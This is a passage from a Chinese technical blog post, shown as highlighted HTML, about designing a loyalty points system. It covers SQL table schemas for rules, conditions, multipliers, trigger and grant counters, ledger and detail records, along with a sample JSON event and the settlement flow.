  `event_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'关联事件ID'</span>,
  `calc_type` <span class="hljs-type">varchar</span>(<span class="hljs-number">16</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'积分计算方式'</span>,
  `base_points` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'固定积分值'</span>,
  `calc_base` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'比例积分基数'</span>,
  `calc_value` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'比例积分值'</span>,
  `trigger_threshold` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'触发阈值'</span>,
  `trigger_window` <span class="hljs-type">varchar</span>(<span class="hljs-number">16</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'触发统计窗口'</span>,
  `grant_limit` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'发放次数限制'</span>,
  `grant_window` <span class="hljs-type">varchar</span>(<span class="hljs-number">16</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'发放次数窗口'</span>,
  `expire_type` <span class="hljs-type">varchar</span>(<span class="hljs-number">16</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'积分过期类型'</span>,
  `expire_days` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'积分有效天数'</span>,
  `priority` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'规则优先级'</span>,
  `status` <span class="hljs-type">varchar</span>(<span class="hljs-number">16</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'规则状态'</span>,
  `start_at` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'规则生效开始时间'</span>,
  `end_at` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'规则生效结束时间'</span>,
  `created_at` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">'创建时间'</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`rule_id`)
);
</code></pre>
<p>规则主表只描述<strong>这条规则是什么、何时生效、如何计算积分</strong>，而不关心具体的条件判断细节。</p>
<p>条件相关的判断逻辑，则被拆分到了独立的规则条件表中：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `point_rule_condition` (
  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  `rule_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'关联规则ID'</span>,
  `field` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'事件 payload 字段'</span>,
  `op` <span class="hljs-type">varchar</span>(<span class="hljs-number">16</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'运算符'</span>,
  `<span class="hljs-keyword">value</span>` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'比较值'</span>,
  `value2` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'BETWEEN 第二个值'</span>,
  `group_no` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'条件组编号'</span>,
  `created_at` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`)
);
</code></pre>
<p>通过将规则行为和条件判断拆分开来，规则模型在保持结构清晰的同时，也具备了足够的扩展能力。</p>
<h4 data-id="heading-11">我们小结一下这一层设计</h4>
<p>通过这种设计，积分规则在系统中的角色非常明确：</p>
<ul>
<li>事件负责告诉系统“发生了什么”</li>
<li>规则负责决定“是否发积分、怎么发、发多少”</li>
<li>条件负责限定“在什么前提下才允许生效”</li>
</ul>
<p>也正是这种围绕事件展开、层次清晰的规则设计，才让积分系统在规则复杂度不断上升的情况下，依然保持可控和可维护。</p>
<hr/>
<h3 data-id="heading-12">积分规则域（三）：活动加成与积分倍率的设计</h3>
<p>在积分事件和积分规则都确定之后，实际我们实际业务中很快会遇到一类非常典型的需求： <strong>在特定时间、特定场景下，对已有积分规则进行额外加成。</strong></p>
<p>例如双倍积分日、节假日活动、阶段性促活活动等。 这些需求本质上并不是“新增一条积分规则”，而是希望在原有规则之上，进行一次<strong>临时性的积分放大</strong>。</p>
<p>如果每次活动都通过复制规则、调整积分值来实现，不仅规则数量会迅速膨胀，也会让活动结束后的回收变得非常混乱。 因此，在设计上，我们将这类需求单独抽象成了<strong>积分倍率层</strong>。</p>
<h4 data-id="heading-13">活动倍率在后台中的表现形式</h4>
<p>在后台中，积分倍率以“倍率活动”的形式存在，如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a60c9f6d7b944d983eba64e65765ae9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=pc36AoCa4mnJCElKspYnXHGN6BE%3D" alt="image-20251230213601395" loading="lazy"/></p>
<p>倍率活动本身只关注几件事情： 活动名称、作用事件、作用规则范围、倍率大小以及生效时间。</p>
<p>这里有一个非常重要的设计点： 倍率活动并不是随时可以编辑的配置项，尤其是在活动生效期间，<strong>通常是不允许直接修改的</strong>，或者需要走额外的审核流程。</p>
<p>这是因为倍率本身属于“放大器”，一旦配置错误，影响范围会非常大。 相比积分规则，倍率更偏向于活动级别的控制能力，因此在权限和操作上都需要更加谨慎。</p>
<h4 data-id="heading-14">倍率的作用范围与边界</h4>
<p>在倍率配置中，倍率可以作用在不同层级上，如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/912d4cae5fbe453ab5522935c9be06e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=cljGhM1h80wBEpXJp0HkAoemhSk%3D" alt="image-20251230213705090" loading="lazy"/></p>
<ul>
<li>作用于某一个事件，表示该事件下的所有积分规则都会被放大；</li>
<li>也可以精确作用于某一条规则，只对指定规则生效。</li>
</ul>
<p>这种设计让倍率既可以支持“全量活动”，也可以支持“精准加成”，而不需要在规则层面做额外拆分。</p>
<p>同时，倍率始终依赖明确的生效时间窗口。 一旦超过结束时间，倍率自然失效，不需要人工回滚规则状态，从而避免活动结束后遗留配置的问题。</p>
<h4 data-id="heading-15">积分倍率配置表设计说明</h4>
<p>对应后台中的倍率活动配置，底层使用了一张独立的倍率配置表来承载相关数据：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `point_multiplier_config` (
  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">'倍率配置ID'</span>,
  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'活动名称（如 双倍积分日）'</span>,
  `event_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'事件ID，关联 point_event.id'</span>,
  `rule_code` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'可选：仅对某条规则生效'</span>,
  `multiplier` <span class="hljs-type">decimal</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'倍率值'</span>,
  `start_at` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'开始时间'</span>,
  `end_at` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'结束时间'</span>,
  `status` <span class="hljs-type">varchar</span>(<span class="hljs-number">16</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'状态'</span>,
  `created_at` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">'创建时间'</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`)
) ENGINE<span class="hljs-operator">=</span>InnoDB COMMENT<span class="hljs-operator">=</span><span class="hljs-string">'积分倍率配置表'</span>;
</code></pre>
<p>在这张表中，各字段的职责划分非常清晰：</p>
<ul>
<li><code>event_id</code> 用于限定倍率的作用事件范围；</li>
<li><code>rule_code</code> 用于进一步缩小作用规则范围（为空表示作用于事件下所有规则）；</li>
<li><code>multiplier</code> 用于描述倍率大小；</li>
<li><code>start_at</code> 和 <code>end_at</code> 明确限定倍率的生效时间窗口；</li>
<li><code>status</code> 用于控制倍率活动是否启用。</li>
</ul>
<p>倍率配置表本身并不参与规则判断，也不关心积分是如何计算的。 它只在规则执行完成之后，对最终积分结果进行一次放大处理。</p>
<h4 data-id="heading-16">为什么要把倍率单独拆出来</h4>
<p>我们通过将活动倍率从积分规则中拆分出来，整个积分系统的职责边界会变得非常清晰：</p>
<ul>
<li>事件负责描述“发生了什么”</li>
<li>规则负责决定“是否发积分、发多少”</li>
<li>倍率负责在特定时间内“放大结果”</li>
</ul>
<p>这种分层设计，使得活动类需求可以快速上线和下线，而不会对原有规则体系造成结构性影响。</p>
<p>也正是因为倍率被限制在清晰的作用范围和时间窗口内，积分系统在面对频繁活动调整时，依然能够保持稳定和可控。</p>
<hr/>
<h3 data-id="heading-17">总结一下</h3>
<p>到这里，积分规则域的三层结构已经完整展开：</p>
<ul>
<li>积分事件：限定系统能感知的行为范围</li>
<li>积分规则：围绕事件定义积分发放逻辑</li>
<li>积分倍率：在规则之上进行活动级别的加成控制</li>
</ul>
<p>在这一层设计完成之后，积分系统的“规则决策部分”已经基本成型。 接下来，就可以开始关注积分是如何真正落到账户上的，以及在过程中如何保证可审计和可回溯。</p>
<hr/>
<h3 data-id="heading-18">积分执行层：一次事件是如何被结算成积分的</h3>
<p>在前面几节中，我们已经把<strong>积分事件、积分规则、倍率活动</strong>都拆分清楚了。 但这些配置本身并不会“自动产生积分”。</p>
<p>真正关键的问题在于： <strong>当业务侧上报一个事件时，这个事件是如何一步步被结算为积分，并且保证安全、可控、可回溯的？</strong></p>
<p>这一节，我们就从一次标准的事件上报开始，完整梳理积分系统内部的执行流程。</p>
<h4 data-id="heading-19">一次积分事件的上报格式</h4>
<p>在业务侧，所有积分相关行为最终都会被抽象成一次事件上报，请求格式大致如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"eventCode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ORDER_PAY"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"userId"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10001</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"sourceId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ORDER_202502010001"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"eventTime"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2025-02-01T12:30:00"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"payload"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"amount"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">126.50</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"channel"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"APP"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"payType"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"WX"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>这个结构有几个非常重要的设计点：</p>
<ul>
<li><code>eventCode</code> 用于标识业务行为类型</li>
<li><code>sourceId</code> 用于幂等控制，防止重复结算</li>
<li><code>eventTime</code> 用于规则时间窗口判断</li>
<li><code>payload</code> 承载规则判断和比例计算所需的业务数据</li>
</ul>
<p>在积分系统中，我们不会关心业务的上下文细节，只关心这些<strong>已经被标准化的事件信息</strong>。</p>
<h4 data-id="heading-20">积分结算的整体执行流程</h4>
<p>当事件进入积分系统后，整体执行流程可以抽象为下面几个步骤：</p>
<pre><code class="hljs language-text" lang="text">1. 校验事件是否合法、是否可用
2. 查询该事件下所有可用的积分规则
3. 按规则逐条判断是否命中
4. 计算基础积分（固定 / 比例）
5. 应用活动倍率（如双倍积分）
6. 判断是否超过发放限制
7. 记录积分流水与明细
8. 更新用户积分账户余额
</code></pre>
<p>大概逻辑流程如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b7aaf900ea44b709bd18dc63f38373d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=%2BGOxxsc2OGS%2F0mB2gsIj6pMS%2Bbs%3D" alt="Unified Portal SSO-2025-12-30-135907" loading="lazy"/></p>
<p>这个流程并不复杂，但每一步都有明确的边界和数据支撑。</p>
<p>下面我们按模块拆开来看。</p>
<h4 data-id="heading-21">规则命中判断：条件不是写在代码里的</h4>
<p>在积分规则执行之前，系统首先会判断<strong>规则是否在当前事件上下文中生效</strong>。</p>
<p>这里我们并没有把规则条件写死在代码里，而是通过一张<strong>规则条件表</strong>来进行动态匹配。</p>
<p>规则条件的设计遵循两个非常重要的约定：</p>
<ul>
<li>同一个条件组内，是 <strong>AND</strong> 关系</li>
<li>不同条件组之间，是 <strong>OR</strong> 关系</li>
</ul>
<p>也就是说，一条规则可以表达出类似这样的逻辑：</p>
<blockquote>
<p>（金额 ≥ 100 且 渠道 = APP） 或 （金额 ≥ 200）</p>
</blockquote>
<p>在执行时，我们只做一件事： <strong>拿事件 payload 中的数据，与条件表进行匹配判断。</strong></p>
<p>如果规则没有配置任何条件，则默认视为“无条件规则”，始终生效。</p>
<h4 data-id="heading-22">触发次数与发放次数：我们刻意拆开的两件事</h4>
<p>在设计积分系统时，有一个点非常容易被忽略： <strong>规则被触发，并不等于积分一定会被发放。</strong></p>
<p>很多早期的积分实现，往往把这两件事情混在一起： 事件来了 → 判断条件 → 直接加积分。 一开始用着没问题，但一旦规则稍微复杂一点，就会开始失控。</p>
<p>所以在这一版设计里，我们刻意把这两件事情拆开来处理： <strong>一次是“触发是否达标”，一次是“是否还能发放”。</strong></p>
<p><strong>触发统计：这条规则被“碰到”了多少次？</strong></p>
<p>先看触发统计这一层，它解决的是类似下面这些需求：</p>
<ul>
<li>连续签到 3 次，才给一次积分</li>
<li>累计完成 N 次某个行为后，再发奖励</li>
</ul>
<p>也就是说，规则不是一来就生效，而是要“攒次数”。</p>
<p>为此我们单独设计了一张<strong>规则触发统计表</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `point_rule_trigger` (
  `user_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'用户ID'</span>,
  `rule_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'规则ID'</span>,
  `trigger_key` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'触发统计周期Key（如 2025-01-01）'</span>,
  `trigger_count` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'0'</span> COMMENT <span class="hljs-string">'当前周期内已触发次数'</span>,
  `updated_at` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">'最近一次触发时间'</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`user_id`,`rule_id`,`trigger_key`)
) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 COMMENT<span class="hljs-operator">=</span><span class="hljs-string">'积分规则触发统计表（用于触发N次才发积分）'</span>;
</code></pre>
<p>这张表的关注点非常单一： <strong>在某个统计周期内，这条规则被这个用户触发了多少次。</strong></p>
<ul>
<li>周期用 <code>trigger_key</code> 表示，比如按天、按周</li>
<li>每次事件命中规则，就累加一次</li>
<li>是否“达到触发阈值”，只和这张表有关</li>
</ul>
<p>它不关心积分发没发，只负责数次数。</p>
<p><strong>发放限制：这个周期内还能不能再发？</strong></p>
<p>接下来是发放限制这一层，它解决的是另一类问题：</p>
<ul>
<li>每天最多发放 1 次</li>
<li>每周最多发放 3 次</li>
<li>防止同一规则被疯狂刷分</li>
</ul>
<p>这里我们同样单独设计了一张表，而不是复用触发表：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `point_rule_grant` (
  `user_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'用户ID'</span>,
  `rule_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'规则ID'</span>,
  `grant_key` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'发放周期Key（如 2025-01-01）'</span>,
  `grant_count` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'0'</span> COMMENT <span class="hljs-string">'当前周期内已发放次数'</span>,
  `updated_at` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">'最近一次发放时间'</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`user_id`,`rule_id`,`grant_key`)
) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 COMMENT<span class="hljs-operator">=</span><span class="hljs-string">'积分规则发放限制表（用于限制每日/每周发放次数）'</span>;
</code></pre>
<p>这张表只做一件事： <strong>在当前发放周期内，这条规则已经真正发放了多少次积分。</strong></p>
<ul>
<li>不关心规则有没有被触发</li>
<li>不关心触发条件是否满足</li>
<li>只在“准备发积分”之前做一次拦截判断</li>
</ul>
<p>如果已经达到上限，哪怕触发条件满足，也会被直接拦掉。</p>
<p><strong>为什么一定要拆成两张表？</strong></p>
<p>这里其实是一个很典型的系统设计取舍。</p>
<p>如果把触发次数和发放次数揉在一起：</p>
<ul>
<li>连续触发类规则会变得很难理解</li>
<li>发放限制逻辑会越来越绕</li>
<li>后期加新规则，几乎只能改代码</li>
</ul>
<p>而拆开之后，规则执行的语义会非常清晰：</p>
<ul>
<li><strong>先判断：触发次数够不够</strong></li>
<li><strong>再判断：这个周期还能不能发</strong></li>
<li>两个阶段各自有明确的数据支撑</li>
</ul>
<p>这样一来，不管是“连续签到”“满 N 次奖励”，还是“每天最多一次”，都可以通过组合配置完成，而不需要在代码里写特殊判断。</p>
<p>这也是后续规则体系能够持续扩展、却不失控的一个关键点。</p>
<h4 data-id="heading-23">基础积分计算与倍率叠加</h4>
<p>当规则被确认命中之后，系统会先计算<strong>基础积分</strong>：</p>
<ul>
<li>固定积分：直接取配置值</li>
<li>比例积分：根据 payload 中的金额字段进行向下取整计算</li>
</ul>
<p>基础积分计算完成后，并不会立刻入账。 系统还会额外做一步：<strong>查询是否命中积分倍率活动</strong>。</p>
<p>倍率的作用非常明确：</p>
<ul>
<li>不修改规则</li>
<li>不修改基础计算逻辑</li>
<li>只在最终结果上做一次放大</li>
</ul>
<p>最终得到的，是一个“倍率前积分 + 实际生效倍率 + 最终积分值”的完整计算结果。</p>
<h4 data-id="heading-24">为什么要区分流水、明细和账户</h4>
<p>在积分真正入账的时候，我们并不是简单地去更新一个“余额字段”。 相反，每一次积分结算，都会同时写入三类数据：<strong>积分流水、积分明细和积分账户</strong>。</p>
<p>这三张表看起来都和“积分”有关，但在设计上承担的是完全不同的职责。</p>
<p><strong>积分流水（Ledger）：把每一次变动讲清楚</strong></p>
<p>积分流水更像是一份<strong>审计级账本</strong>。 它关注的不是“现在还剩多少分”，而是这一次积分<strong>为什么会变成这样</strong>。</p>
<p>对应的表结构如下：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `point_ledger` (
  `tx_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">'积分流水ID，全局唯一'</span>,
  `user_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'用户ID'</span>,
  `rule_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'积分规则ID'</span>,
  `source_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'业务来源ID（订单ID/签到ID等，用于幂等）'</span>,
  `change_amount` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'本次积分变动值'</span>,
  `before_balance` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'变动前余额'</span>,
  `origin_amount` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'倍率前的原始积分值'</span>,
  `applied_multiplier` <span class="hljs-type">decimal</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'实际生效倍率'</span>,
  `multiplier_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'命中的倍率配置ID'</span>,
  `after_balance` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'变动后余额'</span>,
  `type` <span class="hljs-type">varchar</span>(<span class="hljs-number">16</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'EARN/SPEND/EXPIRE/ADJUST'</span>,
  `remark` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'备注说明'</span>,
  `created_at` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">'创建时间'</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`tx_id`),
  <span class="hljs-keyword">UNIQUE</span> KEY `uk_rule_source` (`rule_id`,`source_id`)
) ENGINE<span class="hljs-operator">=</span>InnoDB COMMENT<span class="hljs-operator">=</span><span class="hljs-string">'积分流水表（审计账本）'</span>;
</code></pre>
<p>这张表记录的是<strong>事实</strong>：</p>
<ul>
<li>这笔积分来自哪条规则</li>
<li>对应哪个业务来源（用于幂等）</li>
<li>发放前后余额如何变化</li>
<li>有没有命中倍率，倍率是多少</li>
</ul>
<p>只要流水在，任何一笔积分都能被完整解释清楚。</p>
<p><strong>积分明细（Detail）：这些积分以后怎么用</strong></p>
<p>和流水不同，积分明细站在的是<strong>资产视角</strong>。 它关注的是：这些积分以后怎么消费、什么时候过期。</p>
<p>表结构如下：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `point_detail` (
  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">'积分明细ID'</span>,
  `user_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'用户ID'</span>,
  `ledger_tx_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'关联的积分流水ID'</span>,
  `amount` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'本次获得的积分数量'</span>,
  `remain_amount` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'当前剩余可用积分'</span>,
  `expired_at` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'过期时间，NULL表示永久有效'</span>,
  `status` <span class="hljs-type">varchar</span>(<span class="hljs-number">16</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'NORMAL'</span> COMMENT <span class="hljs-string">'NORMAL/CONSUMED/EXPIRED'</span>,
  `created_at` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">'创建时间'</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`)
) ENGINE<span class="hljs-operator">=</span>InnoDB COMMENT<span class="hljs-operator">=</span><span class="hljs-string">'积分明细表（资产池，用于过期与消费）'</span>;
</code></pre>
